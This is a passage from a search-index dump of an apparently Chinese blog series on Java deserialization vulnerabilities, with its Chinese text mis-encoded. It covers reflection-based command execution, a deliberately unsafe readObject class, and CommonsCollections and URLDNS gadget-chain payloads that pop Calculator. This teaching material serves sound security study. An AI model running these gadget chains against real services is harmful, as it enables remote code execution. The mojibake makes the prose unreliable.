InvokerTransformer(\"exec\",new Class[] { String.class }, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Comparator comparator = new TransformingComparator(transformerChain); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(1); queue.add(2); Field f = transformerChain.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(transformerChain, transformers); // åºåˆ—åŒ– ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); // ååºåˆ—åŒ– ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); ois.readObject(); } } 4.2.2 CommonsCollection4 Gadget æ”¹è¿› PriorityQueue åˆ©ç”¨é“¾ï¼šå› ä¸º CommonsCollections4 é™¤ 4.0 çš„å…¶ä»–ç‰ˆæœ¬å»æ‰äº† InvokerTransformer çš„ Serializable ç»§æ‰¿ï¼Œå¯¼è‡´æ— æ³•åºåˆ—åŒ–ã€‚æ‰€ä»¥ä¾¿æœ‰äº† CC4ï¼ŒCC4 åªæ˜¯å°† CC2 ä¸­çš„ InvokerTransformer æ›¿æ¢ä¸ºäº† InstantiateTransformerã€‚ åˆ›å»º TemplatesImpl å¯¹è±¡ï¼š TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{getBytescode()}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); åˆ›å»ºä¸€ä¸ªæ­£å¸¸çš„ InvokerTransformer å¯¹è±¡ï¼Œå¹¶ç”¨å®ƒå®ä¾‹åŒ– Comparator : Transformer transformer = new InvokerTransformer(\"toString\", null, null); Comparator comparator = new TransformingComparator(transformer); å®ä¾‹åŒ– PriorityQueue ï¼Œå‘é˜Ÿåˆ—é‡Œæ·»åŠ çš„å…ƒç´ æ˜¯å‰é¢åˆ›å»ºçš„ TemplatesImpl å¯¹è±¡ï¼š PriorityQueue queue = new P","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:4:2","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["ä»£ç å®¡è®¡"],"content":"å‚è€ƒ phith0n Java æ¼«è°ˆç³»åˆ— Javaååºåˆ—åŒ–æ¼æ´åŸç†è§£æ Javaååºåˆ—åŒ–æ¼æ´ä»å…¥é—¨åˆ°å…³é—¨ ä»0å¼€å§‹å­¦Javaååºåˆ—åŒ–æ¼æ´ æ·±å…¥ç†è§£ JAVA ååºåˆ—åŒ–æ¼æ´ Javaååºåˆ—åŒ–åˆ©ç”¨é“¾è¡¥å…¨è®¡åˆ’ Commons-Collections åˆ©ç”¨é“¾åˆ†æ ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:5:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["ä»£ç å®¡è®¡"],"content":"Javaååºåˆ—åŒ–æ¼æ´","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"Java ååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1 ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:0:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1 åºåˆ—åŒ–ä¸ååºåˆ—åŒ–åŸºç¡€ åºåˆ—åŒ–æ˜¯è®© Java å¯¹è±¡è„±ç¦» Java è¿è¡Œç¯å¢ƒçš„ä¸€ç§æ‰‹æ®µï¼Œå¯ä»¥æœ‰æ•ˆçš„å®ç°å¤šå¹³å°ä¹‹é—´çš„é€šä¿¡ã€å¯¹è±¡æŒä¹…åŒ–å­˜å‚¨ã€‚ ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:1:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.1 ç›¸å…³æ–¹æ³• ObjectOutputStream ç±»çš„ writeObject() æ–¹æ³•å¯ä»¥å®ç°åºåˆ—åŒ–ã€‚æŒ‰ Java çš„æ ‡å‡†çº¦å®šæ˜¯ç»™æ–‡ä»¶ä¸€ä¸ª .ser æ‰©å±•åã€‚ ObjectInputStream ç±»çš„ readObject() æ–¹æ³•ç”¨äºååºåˆ—åŒ–ã€‚ ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:1:1","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.2 åºåˆ—åŒ–å‰æ å®ç° java.io.Serializable æ¥å£æ‰å¯è¢«ååºåˆ—åŒ–ï¼Œè€Œä¸”æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„(ç”¨ transient å…³é”®å­—ä¿®é¥°çš„å±æ€§é™¤å¤–ï¼Œä¸å‚ä¸åºåˆ—åŒ–è¿‡ç¨‹) ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:1:2","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.3 æ¼æ´æˆå›  åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœ¬èº«å¹¶ä¸å­˜åœ¨é—®é¢˜ã€‚ä½†å½“è¾“å…¥çš„ååºåˆ—åŒ–çš„æ•°æ®å¯è¢«ç”¨æˆ·æ§åˆ¶ï¼Œé‚£ä¹ˆæ”»å‡»è€…å³å¯é€šè¿‡æ„é€ æ¶æ„è¾“å…¥ï¼Œè®©ååºåˆ—åŒ–äº§ç”Ÿéé¢„æœŸçš„å¯¹è±¡ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­æ‰§è¡Œæ„é€ çš„ä»»æ„ä»£ç ã€‚ ååºåˆ—åŒ– payload ç”Ÿæˆå·¥å…·ï¼šhttps://github.com/frohoff/ysoserial/ ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:1:3","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2 æ¼æ´åŸºæœ¬åŸç† ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:2:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.1 åºåˆ—åŒ– åºåˆ—åŒ–åçš„æ•°æ®å¼€å¤´åŒ…å«ä¸¤å­—èŠ‚çš„é­”æœ¯æ•°å­—ï¼šACEDã€‚æ¥ä¸‹æ¥æ˜¯ä¸¤å­—èŠ‚çš„ç‰ˆæœ¬å· 0005 çš„æ•°æ®ã€‚æ­¤å¤–è¿˜åŒ…å«äº†ç±»åã€æˆå‘˜å˜é‡çš„ç±»å‹å’Œä¸ªæ•°ç­‰ã€‚ åºåˆ—åŒ–çš„æ•°æ®æµä»¥é­”æœ¯æ•°å­—å’Œç‰ˆæœ¬å·å¼€å¤´ï¼Œè¿™ä¸ªå€¼æ˜¯åœ¨è°ƒç”¨ ObjectOutputStream åºåˆ—åŒ–æ—¶ï¼Œç”± writeStreamHeader æ–¹æ³•å†™å…¥ï¼š protected void writeStreamHeader() throws IOException { //STREAM_MAGIC (2 bytes) 0xACED bout.writeShort(STREAM_MAGIC); //STREAM_VERSION (2 bytes) 5 bout.writeShort(STREAM_VERSION); } ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:2:1","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.2 ååºåˆ—åŒ– Javaç¨‹åºä¸­ç±» ObjectInputStream çš„ readObject æ–¹æ³•ç”¨æ¥å°†æ•°æ®æµååºåˆ—åŒ–ä¸ºå¯¹è±¡ã€‚ readObject() æ–¹æ³•åœ¨ååºåˆ—åŒ–æ¼æ´ä¸­å®ƒèµ·åˆ°äº†å…³é”®ä½œç”¨ã€‚å¦‚æœ readObject() æ–¹æ³•è¢«é‡å†™ï¼Œååºåˆ—åŒ–è¯¥ç±»æ—¶è°ƒç”¨ä¾¿æ˜¯é‡å†™åçš„ readObject() æ–¹æ³•ã€‚å¦‚æœè¯¥æ–¹æ³•ä¹¦å†™ä¸å½“çš„è¯å°±æœ‰å¯èƒ½å¼•å‘æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚ å¦‚ï¼š public class Evil implements Serializable { public String cmd; private void readObject(java.io.ObjectInputStream stream) throws Exception { stream.defaultReadObject(); Runtime.getRuntime().exec(cmd); } ä½†æ˜¯ï¼Œå®é™…ä¸­ååºåˆ—åŒ–æ¼æ´çš„æ„é€ æ¯”è¾ƒå¤æ‚ï¼Œè€Œä¸”éœ€è¦å€ŸåŠ© Java çš„ä¸€äº›ç‰¹æ€§ï¼Œå¦‚ Java çš„åå°„ã€‚ ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:2:2","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3 Java åå°„ ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:3:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.1 Java åå°„å®šä¹‰ å¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤Ÿå¾—åˆ°è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼›å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„æ–¹æ³•å’Œå±æ€§ï¼›è¿™ç§åŠ¨æ€è·å–ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸º java è¯­è¨€çš„åå°„æœºåˆ¶ã€‚ åå°„æ˜¯â¼¤å¤šæ•°è¯­â¾”â¾¥éƒ½å­˜åœ¨çš„ç‰¹æ€§ï¼Œå¯¹è±¡å¯ä»¥é€šè¿‡åå°„è·å–å®ƒçš„ç±»ï¼Œç±»å¯ä»¥é€šè¿‡åå°„æ‹¿åˆ°æ‰€æœ‰â½…æ³•ï¼ˆåŒ…æ‹¬ç§æœ‰ï¼‰ï¼Œæ‹¿åˆ°çš„â½…æ³•å¯ä»¥ç›´æ¥è°ƒç”¨ã€‚æ€»ä¹‹ï¼Œé€šè¿‡åå°„ï¼Œå¯ä»¥å°† Java è¿™ç§é™æ€è¯­â¾”é™„åŠ ä¸ŠåŠ¨æ€ç‰¹æ€§ã€‚ Java è¯­è¨€è™½ç„¶ä¸åƒ PHP é‚£æ ·å­˜åœ¨è®¸å¤šçµæ´»çš„åŠ¨æ€ç‰¹æ€§ï¼Œä½†æ˜¯é€šè¿‡åå°„ï¼Œå¯ä»¥è¾¾åˆ°ä¸€å®šçš„æ•ˆæœï¼Œå¦‚ä¸‹é¢è¿™æ®µä»£ç ï¼Œåœ¨ä¼ å…¥å‚æ•°å€¼ä¸ç¡®å®šçš„æƒ…å†µä¸‹ï¼Œè¯¥å‡½æ•°çš„å…·ä½“ä½œç”¨æ˜¯æœªçŸ¥çš„ã€‚ public void execute(String className, String methodName) throws Exception { Class clazz = Class.forName(className); clazz.getMethod(methodName).invoke(clazz.newInstance()); } åœ¨ Java ä¸­å®šä¹‰çš„ä¸€ä¸ªç±»æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå³ java.lang.Class ç±»çš„å®ä¾‹ï¼Œè¿™ä¸ªå®ä¾‹ç§°ä¸ºç±»å¯¹è±¡ ç±»å¯¹è±¡è¡¨ç¤ºæ­£åœ¨è¿è¡Œçš„ Java åº”ç”¨ç¨‹åºä¸­çš„ç±»å’Œæ¥å£ ç±»å¯¹è±¡æ²¡æœ‰å…¬å…±æ„é€ æ–¹æ³•ï¼Œç”± Java è™šæ‹Ÿæœºè‡ªåŠ¨æ„é€  ç±»å¯¹è±¡ç”¨äºæä¾›ç±»æœ¬èº«çš„ä¿¡æ¯ï¼Œæ¯”å¦‚æœ‰å‡ ç§æ„é€ æ–¹æ³•ï¼Œ æœ‰å¤šå°‘å±æ€§ï¼Œæœ‰å“ªäº›æ™®é€šæ–¹æ³• è¦å¾—åˆ°ç±»çš„æ–¹æ³•å’Œå±æ€§ï¼Œé¦–å…ˆå°±è¦å¾—åˆ°è¯¥ç±»å¯¹è±¡ ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:3:1","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.2 è·å–ç±»å¯¹è±¡ å‡è®¾ç°åœ¨æœ‰ä¸€ä¸ª Person ç±»ï¼š public class Person implements Serializable { private String name; private Integer age; public Person(String name, Integer age) { this.name = name; this.age = age; } public void setName(String name) { this.name = name; } public String getName() { return this.name; } public Integer getAge() { return age; } public void setAge(Integer age) { this.age = age; } } è¦è·å–è¯¥ç±»å¯¹è±¡ä¸€èˆ¬æœ‰ä¸‰ç§æ–¹æ³•ï¼š class.forName(\"com.geekby.Person\") Person.class new Person().getClass() æœ€å¸¸ç”¨çš„æ˜¯ç¬¬ä¸€ç§ï¼Œé€šè¿‡ä¸€ä¸ªå­—ç¬¦ä¸²å³ç±»çš„å…¨è·¯å¾„åå°±å¯ä»¥å¾—åˆ°ç±»å¯¹è±¡ã€‚ ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:3:2","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.3 åˆ©ç”¨ç±»å¯¹è±¡åˆ›å»ºå¯¹è±¡ ä¸ç›´æ¥ new åˆ›å»ºå¯¹è±¡ä¸åŒï¼Œåå°„æ˜¯å…ˆæ‹¿åˆ°ç±»å¯¹è±¡ï¼Œç„¶åé€šè¿‡ç±»å¯¹è±¡è·å–æ„é€ å™¨å¯¹è±¡ï¼Œå†é€šè¿‡æ„é€ å™¨å¯¹è±¡åˆ›å»ºä¸€ä¸ªå¯¹è±¡ã€‚ package com.geekby; import java.lang.reflect.*; public class CreateObject { public static void main(String[] args) throws Exception { Class PersonClass = Class.forName(\"com.geekby.Person\"); Constructor constructor = PersonClass.getConstructor(String.class, Integer.class); Person p = (Person)constructor.newInstance(\"Geekby\", 24); System.out.println(p.getName()); } } æ–¹æ³• è¯´æ˜ getConstructor(Classâ€¦ parameterTypes) è·å¾—è¯¥ç±»ä¸­ä¸å‚æ•°ç±»å‹åŒ¹é…çš„å…¬æœ‰æ„é€ æ–¹æ³• getConstructors() è·å¾—è¯¥ç±»çš„æ‰€æœ‰å…¬æœ‰æ„é€ æ–¹æ³• getDeclaredConstructor(Classâ€¦ parameterTypes) è·å¾—è¯¥ç±»ä¸­ä¸å‚æ•°ç±»å‹åŒ¹é…çš„æ„é€ æ–¹æ³• getDeclaredConstructors() è·å¾—è¯¥ç±»æ‰€æœ‰æ„é€ æ–¹æ³• ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:3:3","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.4 åˆ©ç”¨åå°„è°ƒç”¨æ–¹æ³• public class CallMethod { public static void main(String[] args) throws Exception { Class PersonClass = Class.forName(\"com.geekby.Person\"); Constructor constructor = PersonClass.getConstructor(String.class, Integer.class); Person p = (Person)constructor.newInstance(\"Geekby\", 24); Method m = PersonClass.getDeclaredMethod(\"setName\", String.class); m.invoke(p, \"newGeekby\"); System.out.println(p.getName()); } } æ–¹æ³• è¯´æ˜ getMethod(String name, Classâ€¦ parameterTypes) è·å¾—è¯¥ç±»æŸä¸ªå…¬æœ‰çš„æ–¹æ³• getMethods() è·å¾—è¯¥ç±»æ‰€æœ‰å…¬æœ‰çš„æ–¹æ³• getDeclaredMethod(String name, Classâ€¦ parameterTypes) è·å¾—è¯¥ç±»æŸä¸ªæ–¹æ³• getDeclaredMethods() è·å¾—è¯¥ç±»æ‰€æœ‰æ–¹æ³• ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:3:4","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.5 é€šè¿‡åå°„è®¿é—®å±æ€§ public class AccessAttribute { public static void main(String[] args) throws Exception { Class PersonClass = Class.forName(\"com.geekby.Person\"); Constructor constructor = PersonClass.getConstructor(String.class, Integer.class); Person p = (Person) constructor.newInstance(\"Geekby\", 24); // nameæ˜¯ç§æœ‰å±æ€§ï¼Œéœ€è¦å…ˆè®¾ç½®å¯è®¿é—® Field f = PersonClass.getDeclaredField(\"name\"); f.setAccessible(true); f.set(p, \"newGeekby\"); System.out.println(p.getName()); } } æ–¹æ³• è¯´æ˜ getField(String name) è·å¾—æŸä¸ªå…¬æœ‰çš„å±æ€§å¯¹è±¡ getFields() è·å¾—æ‰€æœ‰å…¬æœ‰çš„å±æ€§å¯¹è±¡ getDeclaredField(String name) è·å¾—æŸä¸ªå±æ€§å¯¹ getDeclaredFields() è·å¾—æ‰€æœ‰å±æ€§å¯¹è±¡ ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:3:5","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.6 åˆ©ç”¨åå°„æ‰§è¡Œä»£ç  public class Exec { public static void main(String[] args) throws Exception { //java.lang.Runtime.getRuntime().exec(\"calc\"); Class runtimeClass = Class.forName(\"java.lang.Runtime\"); // getRuntimeæ˜¯é™æ€æ–¹æ³•ï¼Œinvokeæ—¶ä¸éœ€è¦ä¼ å…¥å¯¹è±¡ Object runtime = runtimeClass.getMethod(\"getRuntime\").invoke(null); runtimeClass.getMethod(\"exec\", String.class).invoke(runtime,\"open /System/Applications/Calculator.app\"); } } ä»¥ä¸Šä»£ç ä¸­ï¼Œåˆ©ç”¨äº† Java çš„åå°„æœºåˆ¶æŠŠæˆ‘ä»¬çš„ä»£ç æ„å›¾éƒ½åˆ©ç”¨å­—ç¬¦ä¸²çš„å½¢å¼è¿›è¡Œä½“ç°ï¼Œä½¿å¾—åŸæœ¬åº”è¯¥æ˜¯å­—ç¬¦ä¸²çš„å±æ€§ï¼Œå˜æˆäº†ä»£ç æ‰§è¡Œçš„é€»è¾‘ï¼Œè€Œè¿™ä¸ªæœºåˆ¶ä¹Ÿæ˜¯åç»­çš„æ¼æ´ä½¿ç”¨çš„å‰æã€‚ tips invoke çš„ä½œç”¨æ˜¯æ‰§è¡Œæ–¹æ³•ï¼Œå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯: å¦‚æœè¯¥æ–¹æ³•ä¸ºæ™®é€šæ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»å¯¹è±¡ å¦‚æœè¯¥æ–¹æ³•ä¸ºé™æ€æ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»æˆ– null æ­¤å¤–ï¼Œå¦ä¸€ç§å¸¸ç”¨çš„æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼ ProcessBuilderï¼Œé€šè¿‡åå°„æ¥è·å–å…¶æ„é€ å‡½æ•°ï¼Œç„¶åè°ƒç”¨ start() æ¥æ‰§è¡Œå‘½ä»¤: Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(\"calc.exe\"))).start(); æŸ¥çœ‹æ–‡æ¡£å¯çŸ¥ï¼šProcessBuilder æœ‰ä¸¤ä¸ªæ„é€ å‡½æ•°ï¼š public ProcessBuilder(List\u003cString\u003e command) public ProcessBuilder(String... command) ä¸Šé¢é€šè¿‡åå°„çš„è°ƒç”¨æ–¹å¼ä½¿ç”¨äº†ç¬¬ä¸€ç§å½¢å¼çš„æ„é€ å‡½æ•°ã€‚ ä½†æ˜¯ï¼Œä¸Šè¿°çš„ Payload ç”¨åˆ°äº† Java é‡Œçš„å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬åˆ©ç”¨æ¼æ´çš„æ—¶å€™(åœ¨è¡¨è¾¾å¼ä¸Šä¸‹æ–‡ä¸­)æ˜¯æ²¡æœ‰è¿™ç§è¯­æ³•çš„ã€‚å› æ­¤ï¼Œä»éœ€åˆ©ç”¨åå°„æ¥æ‰§è¡Œ start æ–¹æ³•ã€‚ Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); clazz.getMethod(\"start\").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(\"open\", \"/System/Applications/Calculator.app\"))); ä¸Šè¿°çš„ç¬¬äºŒç§æ„é€ å‡½æ•°å¦‚ä½•è°ƒç”¨å‘¢ï¼Ÿ å¯¹äºå¯å˜é•¿å‚æ•°ï¼ŒJava åœ¨ç¼–è¯‘çš„æ—¶å€™ä¼šç¼–è¯‘æˆä¸€ä¸ªæ•°ç»„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚ä¸‹è¿™ä¸¤ç§å†™æ³•åœ¨åº•å±‚æ˜¯ç­‰ä»·çš„ï¼š public void hello(String[]names){} public void hello(String...names){} å› æ­¤ï¼Œå¯¹äºåå°„æ¥è¯´ï¼Œå¦‚æœç›®æ ‡å‡½æ•°é‡ŒåŒ…å«å¯å˜é•¿å‚æ•°ï¼Œä¼ å…¥æ•°ç»„å³å¯ã€‚ Classclazz = Class.forName(\"java.lang.ProcessBuilder\"); clazz.getConstructor(String[].class) åœ¨è°ƒç”¨ newInstance çš„æ—¶å€™ï¼Œå› ä¸ºè¯¥å‡½æ•°æœ¬èº«æ¥æ”¶çš„æ˜¯ä¸€ä¸ªå¯å˜é•¿å‚æ•°ï¼š ä¼ ç»™ ProcessBuilder çš„ä¹Ÿæ˜¯ä¸€ä¸ªå¯å˜é•¿å‚æ•°ï¼ŒäºŒè€…å åŠ ä¸ºä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œæ‰€ä»¥æ•´ä¸ª Payload å¦‚ä¸‹: Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); clazz.getMethod(\"start\").invoke(clazz.getConstructor(String[].class).newInstance(new String[][]{{\"open\", \"/System/Applications/Calculator.app\"}})); ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:3:6","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.7 ååºåˆ—åŒ–æ¼æ´ä¸åå°„ åœ¨å®‰å…¨ç ”ç©¶ä¸­ï¼Œä½¿â½¤åå°„çš„â¼€â¼¤â½¬çš„ï¼Œå°±æ˜¯ç»•è¿‡æŸäº›æ²™ç›’ã€‚æ¯”å¦‚ï¼Œä¸Šä¸‹æ–‡ä¸­å¦‚æœåªæœ‰ Integer ç±»å‹çš„æ•°å­—ï¼Œå¦‚ä½•è·å–åˆ°å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ Runtime ç±»ï¼š æ¯”å¦‚å¯ä»¥è¿™æ ·ï¼ˆä¼ªä»£ç ï¼‰ï¼š1.getClass().forName(\"java.lang.Runtime\") ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:3:7","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4 DNSURL gadget åˆ†æ ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:4:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4.1 è°ƒç”¨é“¾ * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() payloadï¼š HashMap ht = new HashMap(); URL u = new URL(\"dnslog\"); // 